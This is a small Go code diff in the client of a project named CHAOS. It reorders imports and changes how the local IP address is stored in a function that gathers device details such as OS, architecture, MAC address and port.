@@ -1,13 +1,14 @@
 package information
 
 import (
-	"github.com/tiagorlampert/CHAOS/client/app/entities"
-	"github.com/tiagorlampert/CHAOS/client/app/services"
-	"github.com/tiagorlampert/CHAOS/client/app/utils/network"
 	"os"
 	"os/user"
 	"runtime"
 	"time"
+
+	"github.com/tiagorlampert/CHAOS/client/app/entities"
+	"github.com/tiagorlampert/CHAOS/client/app/services"
+	"github.com/tiagorlampert/CHAOS/client/app/utils/network"
 )
 
 type Service struct {
@@ -38,7 +39,7 @@ func (i Service) LoadDeviceSpecs() (*entities.Device, error) {
 		OSName:         runtime.GOOS,
 		OSArch:         runtime.GOARCH,
 		MacAddress:     macAddress,
-		LocalIPAddress: network.GetLocalIP().String(),
+		LocalIPAddress: network.GetLocalIP(),
 		Port:           i.ServerPort,
 		FetchedUnix:    time.Now().UTC().Unix(),
 	}, nil
